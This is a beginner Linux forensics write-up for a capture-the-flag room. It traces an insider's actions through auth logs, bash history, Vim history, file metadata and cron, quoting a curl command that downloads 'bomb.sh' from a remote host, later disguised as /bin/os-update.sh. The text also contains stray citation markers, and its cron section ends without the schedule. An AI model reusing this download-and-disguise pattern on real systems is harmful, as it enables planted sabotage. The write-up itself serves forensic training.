# TryHackMe | Disgruntled CTF Writeup

This writeup documents the steps taken to solve the **Disgruntled** room on TryHackMe.  
The challenge focuses on **Linux forensics**, analyzing logs and system artifacts to determine what actions a malicious insider performed on the machine.

---

## Challenge Information

- **Platform:** TryHackMe  
- **Room:** Disgruntled  
- **Category:** Linux Forensics  
- **Difficulty:** Beginner  

The scenario involves investigating a workstation previously used by an IT employee who was arrested for running a phishing campaign. The objective is to determine whether the employee left any malicious activity behind. :contentReference[oaicite:0]{index=0}

---

## Investigating Elevated Package Installation

The task indicates that a package was installed using elevated privileges. This suggests that a `sudo` command was executed, which is typically recorded in authentication logs.

First, navigate to the log directory:

```bash
cd /var/log
```

Next, search the authentication logs for installation commands:

```bash
cat auth.log | grep install
```

The log reveals the full command used to install the package:

```
/usr/bin/apt install dokuwiki
```

The log entry also shows the **present working directory (PWD)** when the command was executed:

```
/home/cybert
```

These entries confirm that the package was installed using sudo privileges. :contentReference[oaicite:1]{index=1}

---

## Identifying a Newly Created User

The next step is determining which user account was created after the package installation.

Again, the `auth.log` file is useful for tracking system activity. Searching for user creation commands reveals the relevant entry.

```bash
cat /var/log/auth.log | grep adduser
```

The logs show that the following user account was created:

```
it-admin
```

This indicates that a new privileged user may have been created for malicious purposes. :contentReference[oaicite:2]{index=2}

---

## Investigating Sudo Privilege Changes

The investigation continues by identifying when the `sudoers` file was modified, which would indicate that elevated privileges were granted to a user.

Searching for `visudo` activity in the authentication logs reveals the timestamp.

```bash
cat /var/log/auth.log | grep visudo
```

The logs show that the sudo configuration was modified at:

```
Dec 28 06:27:34
```

During this investigation, it was also discovered that a script file was opened using the `vi` editor.

```bash
cat /var/log/auth.log | grep vi
```

This reveals the file name:

```
bomb.sh
```

---

## Investigating Script Creation

To determine how the script was created, the Bash history of the user `it-admin` can be inspected.

Navigate to the user's home directory and review their command history.

```bash
cat .bash_history
```

The command used to create the script appears as:

```
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

This indicates that the script was downloaded from a remote server. :contentReference[oaicite:3]{index=3}

---

## Tracking the Script Location

The script was later renamed and moved to a different location.  
This can be identified by examining Vim history files.

```bash
cat .viminfo
```

The script was moved to the following path:

```
/bin/os-update.sh
```

---

## Checking File Modification Time

To determine when the script was last modified, file metadata can be inspected.

```bash
stat /bin/os-update.sh
```

The output shows the last modification time:

```
Dec 28 06:29
```

---

## Inspecting the Script

Opening the script reveals its contents.

```bash
nano /bin/os-update.sh
```

The script creates the following file when executed:

```
goodbye.txt
```

---

## Scheduled Execution

To determine when the script will execute, scheduled tasks must be inspected.  
Cron jobs are commonly used for timed execution.

Checking the system crontab reveals the execution schedule.

This indicates the time at which the malicious script is intended to run, confirming that the attacker planted a **logic bomb** to execute automatically.